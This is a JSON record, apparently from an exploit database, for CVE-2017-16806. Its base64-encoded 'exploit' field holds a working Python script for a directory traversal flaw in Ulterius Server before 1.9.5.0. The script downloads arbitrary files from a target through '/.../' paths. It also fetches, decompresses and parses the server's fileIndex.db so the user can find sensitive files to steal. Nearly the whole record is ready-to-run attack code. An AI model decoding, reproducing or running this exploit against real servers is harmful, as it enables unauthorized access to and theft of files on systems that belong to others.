{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBVbHRlcml1cyBTZXJ2ZXIgPCAxLjkuNS4wIERpcmVjdG9yeSBUcmF2ZXJzYWwgQXJiaXRyYXJ5IEZpbGUgQWNjZXNzDQojIERhdGU6IDExLzEzLzIwMTcNCiMgRXhwbG9pdCBBdXRob3I6IFJpY2sgT3Nnb29kDQojIFZlbmRvciBIb21lcGFnZTogaHR0cHM6Ly91bHRlcml1cy5pby8NCiMgU29mdHdhcmUgTGluazogaHR0cHM6Ly9naXRodWIuY29tL1VsdGVyaXVzL3NlcnZlci90cmVlLzBlNGYyMTEzZGEyODdhYWM4OGE4YjRjNWY4MzY0YTAzNjg1ZDM5M2QNCiMgVmVyc2lvbjogPCAxLjkuNS4wDQojIFRlc3RlZCBvbjogV2luZG93cyBTZXJ2ZXIgMjAxMiBSMg0KIyBDVkUgOiBDVkUtMjAxNy0xNjgwNg0KIw0KIyBZb3UgY2FuIGRvd25sb2FkIGFsbW9zdCBhbnkgZmlsZSB0aGF0IHJlc2lkZXMgb24gdGhlIHNhbWUgZHJpdmUgbGV0dGVyIGFzIFVsdGVyaXVzIHNlcnZlci4NCiMgRXhhbXBsZTogaHR0cDovL3VsdGVyaXVzVVJMOjIyMDA2Ly4uLi8uLi4vLi4uLy4uLi8uLi4vLi4uLy4uLi8uLi4vLi4uL3dpbmRvd3Mvd2luLmluaQ0KIw0KIyBVbmZvcnR1bmF0ZWx5LCB5b3UgbmVlZCB0byBrbm93IHRoZSBwYXRoIHRvIHRoZSBmaWxlIHlvdSB3YW50IHRvIGRvd25sb2FkLg0KIyBGb3J0dW5hdGVseSwgVWx0ZXJpdXMgaW5kZXhlcyBldmVyeSBmaWxlIG9uIHRoZSBzeXN0ZW0sIGFuZCBpdCdzIHVzdWFsbHkgc3RvcmVkIGluIHRoZSBzYW1lIHBsYWNlOg0KIyBodHRwOi8vdWx0ZXJpdXNVUkw6MjIwNi8uLi4vZmlsZUluZGV4LmRiDQojDQojIFRoaXMgc2NyaXB0IHdpbGwgcmV0cmlldmUgdGhlIGZpbGVJbmRleC5kYiBmaWxlIGZvciB5b3UsIGRlY29tcHJlc3MgaXQsIGFuZCBwcm9jZXNzIHRoZSBsaXN0IHRvDQojIG1ha2UgaXQgaHVtYW4gcmVhZGFibGUuIFRoZW4geW91IGNhbiB1c2UgdGhlIHNhbWUgc2NyaXB0IHRvIGRvd25sb2FkIGFueSBqdWljeSBmaWxlcyB5b3UgZmluZC4NCiMNCiMgVWx0ZXJpdXMgd3JpdGVzIHRoZSBmb2xsb3dpbmcgdG8gdGhlIGZpbGVJbmRleC5kYiBmaWxlOg0KICAgICMgRmlyc3QgZm91ciBieXRlcyBhcmUgYSB0aW1lc3RhbXAgc28gd2UgY2FuIGlnbm9yZSB0aGlzDQojIFRoZSBuZXh0IGZvdXIgaXRlbXMgcmVwZWF0IHVudGlsIHRoZSBlbmQgb2YgdGhlIGZpbGU6DQogICAgIyBmaWxlbmFtZS5sZW5ndGggKDQgYnl0ZXM/KQ0KICAgICMgZmlsZW5hbWUNCiAgICAjIGRpcmVjdG9yeS5sZW5ndGggKDQgYnl0ZXM/KQ0KICAgICMgZGlyZWN0b3J5DQoNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHN5cw0KaW1wb3J0IGFyZ3BhcnNlDQppbXBvcnQgemxpYg0KaW1wb3J0IHN0cnVjdA0KDQojIFRoaXMgZnVuY3Rpb24gZ3JhYnMgdGhlIGZpbGVuYW1lIG9yIGZpbGUgcGF0aCBmcm9tIHRoZSBmaWxlSW5kZXgNCmRlZiBwcm9jZXNzQ2h1bmsoaSwgZGF0YSk6DQoJbGVuZ3RoID0gc3RydWN0LnVucGFjaygnQicsIGRhdGFbaV0pWzBdDQoJbGVuZ3RoICs9IHN0cnVjdC51bnBhY2soJ0InLCBkYXRhW2krMV0pWzBdDQoJbGVuZ3RoICs9IHN0cnVjdC51bnBhY2soJ0InLCBkYXRhW2krMl0pWzBdDQoJbGVuZ3RoICs9IHN0cnVjdC51bnBhY2soJ0InLCBkYXRhW2krM10pWzBdDQoJDQoJaSArPSA0DQoJZmlsZW5hbWUgPSBkYXRhW2k6aStsZW5ndGhdDQoJaSArPSBsZW5ndGgNCg0KCXJldHVybiBpLCBmaWxlbmFtZQ0KDQojIE1haW4gZnVuY3Rpb24NCmRlZiBtYWluKCk6DQoJIyBQYXJzZSBhcmd1bWVudHMNCglwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbj0nVWx0ZXJpdXMgZXhwbG9pdCBieSBSaWNrIG9zZ29vZCcpDQoJcGFyc2VyLmFkZF9hcmd1bWVudCgndXJsJywgdHlwZT1zdHIsIG5hcmdzPScrJywgaGVscD0nVVJMIG9mIHRoZSBVbHRlcml1cyBzZXJ2ZXIgaW5jbHVkaW5nIHBvcnQnKQ0KCXBhcnNlci5hZGRfYXJndW1lbnQoJy0tcmV0cmlldmUnLCBtZXRhdmFyPSdGSUxFUEFUSCcsIHR5cGU9c3RyLCBuYXJncz0nKycsIGhlbHA9J1JldHJpZXZlIGZpbGUgZnJvbSBzZXJ2ZXIgKGUuZy4gYzpcd2luZG93c1x3aW4uaW5pKScpDQoJcGFyc2VyLmFkZF9hcmd1bWVudCgnLS1pbmRleCcsIGhlbHA9J1JldHJpZXZlLCBkZWNvbXByZXNzLCBhbmQgcHJvY2VzcyBmaWxlSW5kZXguZGIgKExpc3Qgb2YgYWxsIGZpbGVzIGluZGV4ZWQgYnkgVWx0ZXJpdXMpJywgYWN0aW9uPSdzdG9yZV90cnVlJykNCglhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KDQogICAgICAgICMgV2UgYXJlIGdvaW5nIHRvIHJldHJpZXZlIGEgc3BlY2lmaWVkIGZpbGUNCglpZiBhcmdzLnJldHJpZXZlOg0KCQlmaWxlTmFtZSA9IHN0cihhcmdzLnJldHJpZXZlWzBdKQ0KCQkNCiAgICAgICAgICAgICAgICAjIFRoaXMgd29ya3MgZm9yIHRoZSBkZWZhdWx0IFVsdGVyaXVzIGluc3RhbGwgZGlyZWN0b3J5Lg0KCQliYXNlRGlyID0gIi8uLi4vLi4uLy4uLi8uLi4vLi4uLy4uLi8uLi4vLi4uLy4uLi8iDQoJDQogICAgICAgICAgICAgICAgIyBSZW1vdmUgc2xhc2hlcyBmcm9tIG91dHB1dCBmaWxlIG5hbWUNCgkJb3V0RmlsZSA9IGZpbGVOYW1lLnJlcGxhY2UoJ1wnLCdfJykNCgkNCgkJIyBSZW1vdmUgZHJpdmUgbGV0dGVyIGFuZCBjaGFuZ2Ugc2xhc2hlcw0KCQlpZiAiOlwiIGluIGZpbGVOYW1lWzozXToNCgkJCWZpbGVOYW1lID0gZmlsZU5hbWVbMzpdDQoJDQogICAgICAgICAgICAgICAgIyBSZXBsYWNlIHNsYXNoZXMNCgkJZmlsZU5hbWUgPSBmaWxlTmFtZS5yZXBsYWNlKCdcJywnLycpCSMgUmVwbGFjZSBzbGFzaGVzDQoJICAgICAgICANCiAgICAgICAgICAgICAgICAjIEJ1aWxkIFVSTA0KCQl1cmwgPSBzdHIoYXJncy51cmxbMF0pICsgYmFzZURpciArIGZpbGVOYW1lDQoJCXByaW50ICJSZXRyaWV2aW5nICIgKyB1cmwNCgkgICAgDQogICAgICAgICAgICAgICAgIyBEb3dubG9hZCBmaWxlDQoJCXIgPSByZXF1ZXN0cy5nZXQodXJsPXVybCwgc3RyZWFtPVRydWUpCSMgUmV0cmlldmUgZmlsZQ0KCQ0KICAgICAgICAgICAgICAgICMgV3JpdGUgZmlsZQ0KCQlmID0gb3BlbihvdXRGaWxlLCAndycpDQoJCWYud3JpdGUoci5jb250ZW50KQ0KCQ0KICAgICAgICAjIFdlIGFyZSBnb2luZyB0byBkb3dubG9hZCB0aGUgZmlsZUluZGV4LmRiIGZpbGUNCglpZiBhcmdzLmluZGV4Og0KICAgICAgICAgICAgICAgICMgU2V0dXAgdGhlIFVSTA0KCQl1cmwgPSBhcmdzLnVybFswXSArICIvLi4uL2ZpbGVJbmRleC5kYiINCgkJcHJpbnQgIkRvd25sb2FkaW5nICIgKyB1cmwNCg0KICAgICAgICAgICAgICAgICMgRG93bmxvYWQgZmlsZQ0KCQlyID0gcmVxdWVzdHMuZ2V0KHVybD11cmwsIHN0cmVhbT1UcnVlKQ0KCQkNCiAgICAgICAgICAgICAgICAjIGRlY29tcHJlc3MgdGhlIGRhdGENCiAgICAgICAgICAgICAgICBkYXRhID0gemxpYi5kZWNvbXByZXNzKCByLmNvbnRlbnQsIC0xNSApDQoJCQ0KICAgICAgICAgICAgICAgICMgT3BlbiBvdXRwdXQgZmlsZSBmb3Igd3JpdGluZw0KCQlmID0gb3BlbignZmlsZUluZGV4LmRiJywgJ3cnKQ0KCQ0KCQkjIFN0cmlwIG9mZiBoZWFkZXIgaW5mbyAobm90IHN1cmUgd2hhdCB0aGlzIGlzKQ0KCQlkYXRhID0gZGF0YVs4Ol0NCgkJDQoJCSMgUHJvY2VzcyBmaWxlIG5hbWVzIGFuZCB3cml0ZSB0byBvdXRwdXQgZmlsZQ0KCQlpID0gMA0KCQl3aGlsZSBpIDwgbGVuKGRhdGEpOgkNCgkJCWksIGZpbGVuYW1lID0gcHJvY2Vzc0NodW5rKGksIGRhdGEpICAgICAgICAgIyBHZXQgZmlsZSBuYW1lDQoJCQlpLCBkaXJlY3RvcnkgPSBwcm9jZXNzQ2h1bmsoaSwgZGF0YSkgICAgICAgICMgR2V0IGZpbGUgcGF0aA0KCQkJaSArPSA4ICMgU2tpcCB0aGUgRkZGRkZGRkZGRkZGRkZGRg0KCSAgICAJCWYud3JpdGUoZGlyZWN0b3J5ICsgJ1wnICsgZmlsZW5hbWUgKyAnCicpICMgV3JpdGUgdG8gb3V0cHV0IGZpbGUNCgkNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp", 
    "id": "43141", 
    "cves": [
        "CVE-2017-16806"
    ]
}